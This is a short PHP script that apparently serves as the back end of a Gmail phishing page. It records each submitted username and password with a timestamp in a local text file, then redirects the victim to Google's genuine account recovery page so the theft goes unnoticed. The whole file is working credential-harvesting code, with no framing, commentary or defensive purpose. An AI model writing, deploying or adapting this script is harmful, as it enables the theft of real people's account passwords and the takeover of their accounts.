<?php
$date = date('Y-m-d H:i:s');
file_put_contents("usernames.txt", " $date Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
exit();
?>